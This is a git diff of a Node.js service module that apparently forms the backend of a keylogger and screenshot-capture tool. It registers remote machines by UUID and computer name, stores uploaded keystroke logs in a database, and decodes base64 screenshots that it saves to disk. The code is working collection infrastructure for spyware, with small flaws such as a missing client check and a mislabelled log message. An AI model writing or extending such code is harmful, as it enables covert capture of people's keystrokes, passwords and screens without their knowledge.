@@ -1,75 +1,90 @@
 'use strict'
 
+const fs = require('fs')
 const Client = require('../models/Client')
 const clientDao = require('../dao/clientDao')
 const { sequelize } = require('../models/Client')
+const keylogsDao = require('../dao/keylogsDao')
+const Keylog = require('../models/Keylog')
+const screenshotsDao = require('../dao/ScreenshotsDao')
 //const { now } = require('sequelize/types/lib/utils')
 
 const clientService = {
 
-    createOrUpdate: async function (req) {
+    createOrUpdate: async function ({ uuid, data }) {
 
         // Call the DAO to find if a user exists or not
-        const client = await clientDao.findOneByUuid(req.uuid)
+        const client = await clientDao.findOneByUuid(uuid)
 
         // If he doesn't exist, then we create it
         if (!(client instanceof Client)) {
-            return { isNew: true, data: await this.create(req) }
+            return { isNew: true, data: await this.create({ uuid, data }) }
         }
 
         // If he does exist, then we update it
-        return { isNew: false, data: await this.update(req) }
+        return { isNew: false, data: await this.update({ uuid, data }) }
     },
-    create: async function (req) {
+    create: async function ({ uuid, data }) {
 
         const client = await clientDao.insertOne({
-            uuid: req.uuid,
-            pcName: req.data.pcName
+            uuid: uuid,
+            computerName: data.computerName
         })
 
         return client
     },
-    update: async function (req) {
+    update: async function ({ uuid, data }) {
 
         const client = await clientDao.updateOne({
-            uuid: req.uuid,
-            pcName: req.data.pcName
+            uuid: uuid,
+            computerName: data.computerName
         })
 
         return client
     },
-    addKeylogs: async function (uuid, keylogsArray) {
+    addKeylogs: async function ({ uuid, data }) {
 
         const client = await clientDao.findOneByUuid(uuid)
 
         // If he doesn't exist
-        if ((!client instanceof Client)) {
-            console.log("Pas de client")
+        if (!(client instanceof Client)) {
             return { isAdded: false }
         }
 
-        if (keylogsArray instanceof Array) {
-            keylogsArray.forEach(keylogs => {
-                clientDao.insertLogs(client.dataValues.id, keylogs)
-            });
+        const clientId = client.dataValues.id
+        let isAdded = false
+
+        if (data instanceof Array) {
+            for (const element of data) {
+                const keylogs = await keylogsDao.insertOne({ clientId, element })
+
+                if (keylogs instanceof Keylog)
+                    isAdded = true
+            }
         }
-        return { isAdded: true }
+
+        return { isAdded: isAdded }
     },
-    addScreenshot: async function (uuid, screenshot) {
+
+
+
+    addScreenshot: async function ({ uuid, data }) {
 
         const client = await clientDao.findOneByUuid(uuid)
+        const clientId = client.dataValues.id
 
-        // If he doesn't exist
-        if ((!client instanceof Client)) {
-            console.log("Pas de client")
-            return { isAdded: false }
-        }
 
-        if (keylogsArray instanceof Array) {
-            keylogsArray.forEach(keylogs => {
-                clientDao.insertLogs(client.dataValues.id, keylogs)
-            });
-        }
+        const screenshot = Buffer.from(data.screenshot, 'base64')
+
+        const filename = Date.now() + '.jpeg'
+
+        fs.writeFile(filename, screenshot, (err) => {
+            if (err) throw err;
+            console.log('The binary data has been decoded and saved to my-file.png');
+        });
+
+        screenshotsDao.insertOne({ clientId, filename })
+
         return { isAdded: true }
     }
 }
